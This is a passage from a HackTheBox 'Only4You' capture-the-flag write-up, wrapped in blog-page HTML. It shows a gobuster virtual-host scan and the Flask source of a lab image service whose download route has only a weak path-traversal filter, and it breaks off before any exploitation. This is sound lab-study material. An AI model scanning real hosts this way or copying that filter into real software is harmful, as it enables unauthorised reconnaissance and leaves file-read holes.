@@ -1,0 +1,1050 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HackTheBox - Only4You &middot; Congo</title>
+    <meta name="title" content="HackTheBox - Only4You &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        {% img /img/htb.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/onlyforyou-htb/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/onlyforyou-htb/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="HackTheBox - Only4You">
+  <meta property="og:description" content="{% img /img/htb.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-08-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-08-26T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HackTheBox - Only4You">
+<meta name="twitter:description" content="{% img /img/htb.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "HackTheBox - Only4You",
+    "headline": "HackTheBox - Only4You",
+    
+    "abstract": "{% img \/img\/htb.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/onlyforyou-htb\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-08-26T00:00:00\u002b00:00",
+    "datePublished": "2023-08-26T00:00:00\u002b00:00",
+    
+    "dateModified": "2023-08-26T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2457"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox - Only4You
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-08-26 00:00:00 &#43;0000 UTC">26 August 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>{% img /img/htb.png %}
+Writeup for HackTheBox&rsquo;s Only4You machine.</p>
+<!-- more -->
+<p><code>only4you.htb</code> seemed like a static site with the <code>contact</code> functionality where we had some input fields, directory busting did not reveal anything interestin:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Doing the <code>vhost</code> scan, we can see that <code>beta.only4you.htb</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-r" data-lang="r"><span class="line"><span class="cl">❯ <span class="n">gobuster</span> <span class="n">vhost</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="o">://</span><span class="n">only4you.htb</span><span class="o">/</span> <span class="o">-</span><span class="n">w</span> <span class="o">~/</span><span class="n">SecLists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="m">-20000</span><span class="n">.txt</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3.1.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="nf">Reeves </span><span class="p">(</span><span class="o">@</span><span class="n">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="nf">Mehlmauer </span><span class="p">(</span><span class="o">@</span><span class="n">firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">[</span><span class="o">+</span><span class="n">]</span> <span class="n">Url</span><span class="o">:</span>          <span class="n">http</span><span class="o">://</span><span class="n">only4you.htb</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">[</span><span class="o">+</span><span class="n">]</span> <span class="n">Method</span><span class="o">:</span>       <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"><span class="n">[</span><span class="o">+</span><span class="n">]</span> <span class="n">Threads</span><span class="o">:</span>      <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">[</span><span class="o">+</span><span class="n">]</span> <span class="n">Wordlist</span><span class="o">:</span>     <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">SecLists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="m">-20000</span><span class="n">.txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">[</span><span class="o">+</span><span class="n">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="o">:</span>   <span class="n">gobuster</span><span class="o">/</span><span class="m">3.1.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">[</span><span class="o">+</span><span class="n">]</span> <span class="n">Timeout</span><span class="o">:</span>      <span class="m">10</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="m">2023</span><span class="o">/</span><span class="m">04</span><span class="o">/</span><span class="m">23</span> <span class="m">06</span><span class="o">:</span><span class="m">14</span><span class="o">:</span><span class="m">42</span> <span class="n">Starting</span> <span class="n">gobuster</span> <span class="kr">in</span> <span class="n">VHOST</span> <span class="n">enumeration</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Found</span><span class="o">:</span> <span class="nf">beta.only4you.htb </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span> <span class="m">200</span><span class="p">)</span> <span class="n">[Size</span><span class="o">:</span> <span class="m">2191</span><span class="n">]</span>
+</span></span><span class="line"><span class="cl">                                                   
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="m">2023</span><span class="o">/</span><span class="m">04</span><span class="o">/</span><span class="m">23</span> <span class="m">06</span><span class="o">:</span><span class="m">18</span><span class="o">:</span><span class="m">25</span> <span class="n">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></div><p>It seems like an image conversion/resize website and it also allow us to download source code:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_1.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Downloading the source and analyzing the <code>[app.py](http://app.py)</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-r" data-lang="r"><span class="line"><span class="cl">❯ <span class="n">tree</span>
+</span></span><span class="line"><span class="cl"><span class="n">.
+</span></span></span><span class="line"><span class="cl"><span class="n"></span>├── <span class="n">beta</span>
+</span></span><span class="line"><span class="cl">│   ├── <span class="n">app.py</span>
+</span></span><span class="line"><span class="cl">│   ├── <span class="n">static</span>
+</span></span><span class="line"><span class="cl">│   │   └── <span class="n">img</span>
+</span></span><span class="line"><span class="cl">│   │       └── <span class="n">image</span><span class="o">-</span><span class="n">resize.svg</span>
+</span></span><span class="line"><span class="cl">│   ├── <span class="n">templates</span>
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="m">400</span><span class="n">.html</span>
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="m">404</span><span class="n">.html</span>
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="m">405</span><span class="n">.html</span>
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="m">500</span><span class="n">.html</span>
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="n">convert.html</span>
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="n">index.html</span>
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="n">list.html</span>
+</span></span><span class="line"><span class="cl">│   │   └── <span class="n">resize.html</span>
+</span></span><span class="line"><span class="cl">│   ├── <span class="n">tool.py</span>
+</span></span><span class="line"><span class="cl">│   └── <span class="n">uploads</span>
+</span></span><span class="line"><span class="cl">│       ├── <span class="n">convert</span>
+</span></span><span class="line"><span class="cl">│       ├── <span class="n">list</span>
+</span></span><span class="line"><span class="cl">│       └── <span class="n">resize</span>
+</span></span><span class="line"><span class="cl">└── <span class="n">source.zip</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_file</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">send_from_directory</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">uuid</span><span class="o">,</span> <span class="nn">posixpath</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">werkzeug.utils</span> <span class="kn">import</span> <span class="n">secure_filename</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tool</span> <span class="kn">import</span> <span class="n">convertjp</span><span class="p">,</span> <span class="n">convertpj</span><span class="p">,</span> <span class="n">resizeimg</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;MAX_CONTENT_LENGTH&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;RESIZE_FOLDER&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;uploads/resize&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;CONVERT_FOLDER&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;uploads/convert&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;LIST_FOLDER&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;uploads/list&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_EXTENSIONS&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;.jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;.png&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/resize&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">resize</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;file&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Something went wrong, Try again!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">img</span> <span class="o">=</span> <span class="n">secure_filename</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">img</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ext</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">img</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ext</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_EXTENSIONS&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Only png and jpg images are allowed!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl">            <span class="n">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;RESIZE_FOLDER&#39;</span><span class="p">],</span> <span class="n">img</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">status</span> <span class="o">=</span> <span class="n">resizeimg</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="kc">False</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Image is too small! Minimum size needs to be 700x700&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Image is succesfully uploaded!&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;No image selected!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;resize.html&#39;</span><span class="p">,</span> <span class="n">clicked</span><span class="o">=</span><span class="s2">&#34;True&#34;</span><span class="p">),</span> <span class="p">{</span><span class="s2">&#34;Refresh&#34;</span><span class="p">:</span> <span class="s2">&#34;5; url=/list&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;resize.html&#39;</span><span class="p">,</span> <span class="n">clicked</span><span class="o">=</span><span class="s2">&#34;False&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/convert&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;file&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Something went wrong, Try again!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">img</span> <span class="o">=</span> <span class="n">secure_filename</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">img</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ext</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">img</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ext</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_EXTENSIONS&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Only jpg and png images are allowed!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl">            <span class="n">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;CONVERT_FOLDER&#39;</span><span class="p">],</span> <span class="n">img</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ext</span> <span class="o">==</span> <span class="s1">&#39;.png&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">image</span> <span class="o">=</span> <span class="n">convertpj</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;CONVERT_FOLDER&#39;</span><span class="p">],</span> <span class="n">image</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">image</span> <span class="o">=</span> <span class="n">convertjp</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;CONVERT_FOLDER&#39;</span><span class="p">],</span> <span class="n">image</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;No image selected!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;convert.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="n">f</span><span class="o">.</span><span class="n">unlink</span><span class="p">()</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">Path</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;CONVERT_FOLDER&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="s2">&#34;*&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">is_file</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;convert.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/source&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_report</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="s1">&#39;source.zip&#39;</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/list&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">list</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;list.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/download&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">posixpath</span><span class="o">.</span><span class="n">normpath</span><span class="p">(</span><span class="n">image</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;..&#39;</span> <span class="ow">in</span> <span class="n">filename</span> <span class="ow">or</span> <span class="n">filename</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;../&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Hacking detected!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
